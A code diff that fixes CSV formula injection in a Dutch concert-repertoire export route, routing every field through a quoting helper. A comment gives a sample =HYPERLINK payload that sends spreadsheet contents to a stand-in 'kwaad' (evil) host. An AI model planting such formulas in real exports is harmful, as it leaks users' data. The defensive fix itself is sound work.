@@ -10,6 +10,7 @@ import logger from '../utils/logger';
 import { z } from 'zod';
 import { wijzigingsschema } from '../utils/schema';
 import { bijlageKopregel } from '../utils/contentDisposition';
+import { csvRegel } from '../utils/csv';
 
 const router = Router();
 
@@ -744,20 +745,37 @@ router.get(
       return `${mins}:${secs.toString().padStart(2, '0')}`;
     };
 
-    // Generate CSV content
-    let csv = 'Concert,Datum,Locatie,Titel,Componist,Arrangeur,Duur\n';
+    // De gegevensrijen wikkelden de tekstvelden zelf in aanhalingstekens en
+    // verdubbelden die erin ook - structureel klopte dat. Maar geen van de
+    // velden werd tegen een formule beschermd: een stuktitel of concertnaam die
+    // met `=`, `+`, `-` of `@` begint wordt door Excel uitgevoerd zodra iemand
+    // deze aangifte opent, en `=HYPERLINK("http://kwaad/"&A1,"klik")` haalt de
+    // hele lijst dan naar buiten terwijl de gebruiker alleen een link ziet.
+    // Aanhalingstekens houden dat niet tegen; die zijn CSV-syntaxis en worden
+    // bij het inlezen weggehaald voordat de cel geevalueerd wordt.
+    //
+    // De samenvatting onderaan werd bovendien helemaal niet gequoot, en
+    // `startDate`/`endDate` komen ongefilterd uit de queryreeks - er zit geen
+    // datumcontrole tussen. Een komma daarin schoof de regel Periode een kolom
+    // op, en `=1+1` als startDate werd een formule in de aangifte.
+    //
+    // Komma blijft het scheidingsteken: Buma/Stemra en iedereen die deze export
+    // al inleest verwacht die, en overstappen op een puntkomma zou hun import
+    // breken.
+    const regels: string[] = [csvRegel(['Concert', 'Datum', 'Locatie', 'Titel', 'Componist', 'Arrangeur', 'Duur'])];
 
     for (const piece of pieces) {
-      const row = [
-        `"${(piece.concert_name || '').replace(/"/g, '""')}"`,
-        piece.concert_date || '',
-        `"${(piece.concert_location || '').replace(/"/g, '""')}"`,
-        `"${(piece.title || '').replace(/"/g, '""')}"`,
-        `"${(piece.composer || '').replace(/"/g, '""')}"`,
-        `"${(piece.arranger || '').replace(/"/g, '""')}"`,
-        formatDuration(piece.duration_seconds),
-      ];
-      csv += row.join(',') + '\n';
+      regels.push(
+        csvRegel([
+          piece.concert_name || '',
+          piece.concert_date || '',
+          piece.concert_location || '',
+          piece.title || '',
+          piece.composer || '',
+          piece.arranger || '',
+          formatDuration(piece.duration_seconds),
+        ]),
+      );
     }
 
     // Add summary at the end
@@ -765,11 +783,14 @@ router.get(
     const uniqueConcerts = new Set(pieces.map((p) => p.concert_date + p.concert_name)).size;
     const totalDuration = pieces.reduce((sum, p) => sum + (p.duration_seconds || 0), 0);
 
-    csv += '\n';
-    csv += `Periode,${startDate} t/m ${endDate}\n`;
-    csv += `Totaal concerten,${uniqueConcerts}\n`;
-    csv += `Totaal stukken,${totalPieces}\n`;
-    csv += `Totale speelduur,${formatDuration(totalDuration)}\n`;
+    // De lege regel scheidt de samenvatting van de gegevens, zoals voorheen.
+    regels.push('');
+    regels.push(csvRegel(['Periode', `${startDate} t/m ${endDate}`]));
+    regels.push(csvRegel(['Totaal concerten', uniqueConcerts]));
+    regels.push(csvRegel(['Totaal stukken', totalPieces]));
+    regels.push(csvRegel(['Totale speelduur', formatDuration(totalDuration)]));
+
+    const csv = regels.join('\n') + '\n';
 
     // startDate en endDate komen ongefilterd uit de queryreeks - er zit geen
     // datumcontrole tussen - dus wat de client stuurt belandt zo in de
